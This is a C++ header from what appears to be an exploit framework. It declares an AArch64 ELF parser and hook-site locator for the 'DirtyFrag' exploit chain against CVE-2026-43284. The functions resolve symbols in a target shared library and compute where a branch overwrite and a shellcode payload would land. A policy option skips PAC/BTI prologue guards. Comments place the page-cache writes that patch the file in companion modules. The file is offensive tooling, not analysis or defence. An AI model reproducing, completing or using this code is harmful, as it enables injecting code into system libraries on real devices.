#ifndef GHOSTLOCK_BACKEND_CVE_2026_43284_STEPS_ELF_HOOK_HPP
#define GHOSTLOCK_BACKEND_CVE_2026_43284_STEPS_ELF_HOOK_HPP

/* CVE-2026-43284 read-only ELF hook-target location (B5-5, host part).
 *
 * Independent rewrite of the upstream ELF parser used by the DirtyFrag chain:
 *   third_party/dirtyfrag/usermode/ankit/elf_parser.c
 *   third_party/dirtyfrag/usermode/lspromise/elf_parser.c
 * Upstream opens a path and seeks with lseek64/read and never validates the
 * section/segment ranges. Here every traversal is over a caller-owned, fully
 * validated read-only byte span: nothing is allocated, no file descriptor or
 * syscall is touched, and every offset/size is checked against the image before
 * it is dereferenced (fail-closed). The upstream PACIASP/BTI +4 rule is kept as
 * one policy among two; the other rejects the site instead of advancing.
 *
 * Scope: this module only *describes* a hook site and a trampoline plan. It
 * never writes to the target file; the page-cache writes belong to B5-6/B5-9.
 *
 * ADR-0004 R1: this is a backend submodule header and must not include
 * pipeline/. */

#include <cstddef>
#include <cstdint>
#include <string_view>

namespace ghostlock::backend::cve_2026_43284::steps {

    inline constexpr std::size_t kElfHeaderBytes = 64U;
    inline constexpr std::size_t kElfProgramHeaderBytes = 56U;
    inline constexpr std::size_t kElfSectionHeaderBytes = 64U;
    inline constexpr std::size_t kElfSymbolBytes = 24U;
    inline constexpr std::size_t kElfRelaBytes = 24U;
    /* Upper bound on a parsed image so a hostile path cannot make the caller
     * walk an unbounded section/symbol table. The device chain reads a target
     * .so (libc++.so is well under this). */
    inline constexpr std::size_t kElfMaxImageBytes = std::size_t{64U} * 1024U * 1024U;

    /* ARM64 ELF constants (subset). */
    inline constexpr std::uint16_t kElfTypeExec = 2U;
    inline constexpr std::uint16_t kElfTypeDyn = 3U;
    inline constexpr std::uint16_t kElfMachineAarch64 = 0xB7U;
    inline constexpr std::uint32_t kElfProgramLoad = 1U;
    inline constexpr std::uint32_t kElfFlagExec = 0x1U;
    inline constexpr std::uint32_t kElfFlagAlloc = 0x2U;
    inline constexpr std::uint32_t kElfFlagExecInstr = 0x4U;
    inline constexpr std::uint16_t kElfSectionUndef = 0U;

    /* AArch64 prologue-guard instructions the upstream parser special-cases. */
    inline constexpr std::uint32_t kAarch64Paciasp = 0xD503233FU;
    inline constexpr std::uint32_t kAarch64Pacibsp = 0xD503237FU;
    inline constexpr std::uint32_t kAarch64BtiC = 0xD503245FU;
    inline constexpr std::uint32_t kAarch64BtiJ = 0xD503249FU;
    inline constexpr std::uint32_t kAarch64BtiJc = 0xD50324DFU;

    enum class ElfError : std::uint8_t {
        None = 0,
        NullImage,
        TooSmall,
        TooLarge,
        NotElf,
        Not64Bit,
        NotLittleEndian,
        NotAarch64,
        NotExecutableImage,
        BadProgramHeaders,
        NoExecutableSegment,
        BadSectionHeaders,
        MissingText,
        MissingDynsym,
        MissingDynstr,
        OutOfBounds,
        SymbolNotFound,
        SymbolUndefined,
        SymbolBadSection,
        HookNotPatchable,
        PrologueGuard,
        RelocationOverlap,
    };

    /* A bounded [file_offset, file_offset + size) window with an optional
     * virtual address. Every field is validated before it is returned. */
    struct ElfRange final {
        std::uint64_t file_offset = 0U;
        std::uint64_t size = 0U;
        std::uint64_t vaddr = 0U;
    };

    /* Parsed static facts for one ELF64 little-endian AArch64 image. Ranges with
     * has_* == false are absent; the corresponding fields are zero. */
    struct ElfImage final {
        std::uint16_t type = 0U;
        std::uint16_t machine = 0U;

        std::uint64_t phoff = 0U;
        std::uint64_t shoff = 0U;
        std::uint16_t phentsize = 0U;
        std::uint16_t phnum = 0U;
        std::uint16_t shentsize = 0U;
        std::uint16_t shnum = 0U;
        std::uint16_t shstrndx = 0U;

        ElfRange text{};      /* .text */
        ElfRange dynsym{};    /* .dynsym */
        ElfRange dynstr{};    /* .dynstr */
        ElfRange rela_dyn{};  /* .rela.dyn */
        ElfRange rela_plt{};  /* .rela.plt */
        bool has_text = false;
        bool has_dynsym = false;
        bool has_dynstr = false;
        bool has_rela_dyn = false;
        bool has_rela_plt = false;

        /* Executable PT_LOAD chosen to host the hook payload. file_offset/size
         * are p_offset/p_filesz; vaddr is p_vaddr; exec_memsz is p_memsz. The
         * payload landing site is (file_offset + size, vaddr + size) and is
         * mapped only while it stays within exec_memsz. */
        ElfRange exec_segment{};
        std::uint64_t exec_memsz = 0U;
        std::uint16_t exec_segment_index = 0U;
        bool has_exec_segment = false;
    };

    /* One .dynsym entry resolved against its defining section. name points into
     * the caller's image bytes and is valid for as long as the bytes are. */
    struct ElfSymbol final {
        std::string_view name{};
        std::uint64_t value = 0U;      /* st_value (virtual address) */
        std::uint64_t size = 0U;       /* st_size */
        std::uint8_t info = 0U;        /* st_info (bind/type) */
        std::uint16_t section_index = 0U;
        std::uint64_t file_offset = 0U; /* value translated through exec_segment */
        ElfRange section{};            /* defining section range */
    };

    /* Parse an in-memory ELF64 AArch64 image. Requires an executable PT_LOAD
     * and a .text section; .dynsym/.dynstr/.rela sections are optional here and
     * are required only by the consumers that need them. On failure out is
     * cleared and error names the first failing rule. */
    [[nodiscard]] bool parse_elf_image(const std::uint8_t *data, std::size_t size,
                                       ElfImage &out, ElfError &error) noexcept;

    /* Resolve a symbol name through .dynsym/.dynstr. Rejects undefined symbols,
     * symbols whose st_shndx is not an executable+allocated section, and counts
     * whose value leaves its section's [sh_addr, sh_addr + sh_size) window. */
    [[nodiscard]] bool find_elf_symbol(const std::uint8_t *data, std::size_t size,
                                       const ElfImage &image, std::string_view name,
                                       ElfSymbol &out, ElfError &error) noexcept;

    /* How to treat a BTI/PAC prologue guard at the exact hook site. */
    enum class HookGuardPolicy : std::uint8_t {
        /* Fail closed: a guarded entry is reported, never patched. */
        Reject = 0U,
        /* Upstream rule: advance +4 over one PACIASP/PACIBSP/BTI and patch the
         * next instruction; that instruction becomes the displaced one. */
        Skip = 1U,
    };

    struct HookTarget final {
        bool valid = false;
        std::uint64_t hook_file_offset = 0U; /* site the branch overwrites */
        std::uint64_t hook_vaddr = 0U;
        std::uint64_t symbol_vaddr = 0U; /* original st_value (pre-skip) */
        std::uint64_t symbol_size = 0U;
        std::uint32_t displaced_instruction = 0U; /* word the trampoline replays */
        std::uint32_t guard_instruction = 0U;     /* skipped guard, else 0 */
        bool guard_skipped = false;
        ElfRange hook_section{}; /* executable section containing hook_vaddr */
        /* Shellcode landing site: segment end, plus how many bytes still fit
         * before p_memsz. */
        std::uint64_t payload_file_offset = 0U;
        std::uint64_t payload_vaddr = 0U;
        std::uint64_t payload_max_bytes = 0U;
    };

    /* Locate a hook site by symbol name. fail-closed when the symbol is absent,
     * not an executable definition, crosses a relocation, or sits on a prologue
     * guard under HookGuardPolicy::Reject. */
    [[nodiscard]] bool locate_hook_target(const std::uint8_t *data, std::size_t size,
                                          const ElfImage &image, std::string_view symbol,
                                          HookGuardPolicy policy, HookTarget &out,
                                          ElfError &error) noexcept;

    /* Locate a hook site by exact file offset inside the executable segment.
     * Requires 4-byte alignment and an executable section; same guard and
     * relocation rules as the symbol form. */
    [[nodiscard]] bool locate_hook_target_at(const std::uint8_t *data, std::size_t size,
                                             const ElfImage &image, std::uint64_t file_offset,
                                             HookGuardPolicy policy, HookTarget &out,
                                             ElfError &error) noexcept;

    /* True when instruction is a PACIASP/PACIBSP/BTI prologue guard. */
    [[nodiscard]] constexpr bool is_prologue_guard(std::uint32_t instruction) noexcept {
        return instruction == kAarch64Paciasp || instruction == kAarch64Pacibsp ||
               instruction == kAarch64BtiC || instruction == kAarch64BtiJ ||
               instruction == kAarch64BtiJc;
    }

} // namespace ghostlock::backend::cve_2026_43284::steps

#endif
